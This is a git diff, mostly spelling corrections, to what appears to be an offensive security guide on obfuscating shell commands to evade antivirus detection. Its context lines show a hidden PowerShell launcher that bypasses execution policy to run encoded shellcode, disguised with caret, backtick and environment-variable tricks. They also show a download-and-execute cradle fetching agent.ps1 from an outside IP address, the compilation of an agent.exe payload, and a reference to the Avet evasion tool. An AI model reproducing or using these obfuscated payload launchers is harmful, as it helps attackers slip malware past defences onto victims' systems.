@@ -12,13 +12,13 @@
 
       SPECIAL NOTE:
         Remenber that if we chose to use the 'batch' obfuscation technic, then it will only work in MS-DOS
-        interpreter (cmd.exe or file.bat), If we use one 'batch' special caracter in powershell terminal
-        console, then the powershell interpreter will not be hable to escape the special caracter.
+        interpreter (cmd.exe or file.bat), If we use one 'batch' special character in powershell terminal
+        console, then the powershell interpreter will not be able to escape the special character.
 
-**Bad caracter sellection** [ batch escape caracter -used- in powershell interpreter ]
-![bad caracter sellection](http://i.cubeupload.com/5bsI07.jpg)
+**Bad character sellection** [ batch escape character -used- in powershell interpreter ]
+![bad character sellection](http://i.cubeupload.com/5bsI07.jpg)
 
-**Good caracter sellection** [ powershell special caracter used in powershell interpreter ]
+**Good character sellection** [ powershell special character used in powershell interpreter ]
 ![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)
 
 
@@ -28,13 +28,13 @@
 
 - String command to obfuscate<br />
 `cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
-The above string can be obfuscated using the **batch special caracter: ^** <br />
+The above string can be obfuscated using the **batch special character: ^** <br />
 
 - String obfuscated<br />
 
       cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode
 
-- Any formula under the **batch interpreter** can be start with the follow special caracters: **@** or **=** or **,** or **;**
+- Any formula under the **batch interpreter** can be start with the follow special characters: **@** or **=** or **,** or **;**
 
       =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
@@ -76,7 +76,7 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 
 - String command to obfuscate<br />
 `whoami`<br />
-The above string can be obfuscated using **bash special caracters: '** or **\\** or **$@**<br />
+The above string can be obfuscated using **bash special characters: '** or **\\** or **$@**<br />
 
 - String obfuscated<br />
 
@@ -88,7 +88,7 @@ The above string can be obfuscated using **bash special caracters: '** or **\\**
 
       w$@h\o$@am\i <-- using all 3 methods together 
 
-![3 special caracters](http://i.cubeupload.com/tLBdbW.png)
+![3 special characters](http://i.cubeupload.com/tLBdbW.png)
 
 ---
 
@@ -98,7 +98,7 @@ The above string can be obfuscated using **bash special caracters: '** or **\\**
 
 - String command to obfuscate<br />
 `powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
-The above string can be obfuscated using the **powershell special caracter: `**<br />
+The above string can be obfuscated using the **powershell special character: `**<br />
 
 - String obfuscated<br />
 
@@ -108,7 +108,7 @@ The above string can be obfuscated using the **powershell special caracter: `**<
 
 - String command to obfuscate<br />
 `powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
-The above string can be obfuscated using **powershell special caracters:** **`** and **+** and **$var** and **'**<br />
+The above string can be obfuscated using **powershell special characters:** **`** and **+** and **$var** and **'**<br />
 
 - String obfuscated<br />
 
@@ -128,7 +128,7 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 ![powershell obfuscation](http://i.cubeupload.com/G6rj4M.jpg)
 
 - Using **$env:comspec** (windows environment variable) and **-Join ''** to pull out the 4º,15º and 25º characters
-from $env:comspec variable and uses the **-Join ''** operator to take the arraw and convert it to a string.
+from $env:comspec variable and use the **-Join ''** operator to take the arraw and convert it to a string.
 
       $env:comspec[4,15,25]-Join '' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')
 
@@ -226,7 +226,7 @@ from $env:comspec variable and uses the **-Join ''** operator to take the arraw 
 
 - Compile template.c with **GCC** software to **.exe**
 
-      gcc template.c -o agent.exe
+      gcc.exe template.c -o agent.exe
 
 ---
 
@@ -237,6 +237,8 @@ from $env:comspec variable and uses the **-Join ''** operator to take the arraw 
 
       This next technic writes a file to disk before executing shellcode into target ram ..
       'Template taken from Avet anti-virus evasion tool presented in blackhat 2017'.
+
+![avet bypass](http://i.cubeupload.com/ub18vo.png)
 
 <br />
 
